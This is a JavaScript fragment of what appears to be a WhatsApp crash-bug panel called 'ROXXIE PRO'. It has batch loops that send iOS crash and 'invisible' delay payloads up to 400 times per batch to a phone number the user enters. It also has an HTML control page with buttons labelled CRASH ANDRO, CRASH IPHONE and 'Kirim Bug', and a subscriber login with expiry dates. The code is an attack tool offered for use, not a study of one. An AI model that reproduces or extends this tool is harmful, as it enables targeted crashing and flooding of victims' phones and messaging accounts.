        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Iponginvis(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          iosKontakNih(sock, target),
          crashIos(sock, target),
          uiIos(sock, target),
          iosNick(sock, target),
          DelayTagSw(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Invis iPhone 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ROXXIE PRO</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #000000, #330000, #7f0000);
      background-size: 400% 400%;
      animation: bgAnimation 20s ease infinite;
      color: #ff0000;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #ff0000;
      padding: 24px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 16px rgba(255, 0, 0, 0.8);
      backdrop-filter: blur(10px);
      position: relative;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 12px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 16px rgba(255, 0, 0, 0.8);
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      color: #ff0000;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
    }
    .connected {
      font-size: 14px;
      color: #ff0000;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5eff;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #1a0000;
      border: none;
      color: #ff0000;
      margin-bottom: 16px;
    }
    .buttons-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 16px;
    }
    .buttons-grid button {
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #330000;
      color: #ff0000;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }
    .buttons-grid button.selected {
      background: #ff0000;
      color: #000;
    }
    .execute-button {
      background: #990000;
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-bottom: 12px;
      cursor: pointer;
      transition: 0.3s;
    }
    .execute-button:disabled {
      background: #660000;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .execute-button:hover:not(:disabled) {
      background: #ff0000;
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(255, 0, 0, 0.15);
      border: 1px solid #ff0000;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease;
    }
    .footer-button:hover {
      background: rgba(255, 0, 0, 0.3);
    }
    .footer-button a {
      text-decoration: none;
      color: #ff0000;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* POPUP TENGAH */
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: #111;
      color: #00ff5e;
      padding: 16px 22px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,255,94,0.7);
      font-weight: bold;
      display: none;
      z-index: 9999;
      animation: zoomFade 2s ease forwards;
      text-align: center; /* ✅ fix text biar lurus tengah */
    }
    @keyframes zoomFade {
      0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
      15% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      85% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
      100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://files.catbox.moe/dupkuy.jpg" alt="Logo" class="logo" />
    <div class="username">Welcome User, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" placeholder="Please input target number. example : 62xxxx" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH ANDRO</button>
      <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> CRASH IPHONE</button>
      <button class="mode-btn" data-mode="andros-delay"><i class="fas fa-skull-crossbones"></i> INVIS ANDRO</button>
      <button class="mode-btn" data-mode="invis-iphone"><i class="fas fa-dumpster-fire"></i> INVIS IPHONE</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/anonymous_vxc" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <!-- Popup Tengah -->
  <div id="popup" class="popup">✅ Success Send Bug</div>

  <script>
    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const popup = document.getElementById('popup');

    let selectedMode = null;

    function isValidNumber(number) {
      const pattern = /^62\\d{7,13}$/;
      return pattern.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      // Tampilkan pop up sukses
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 2000);

      // Arahkan ke link eksekusi
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};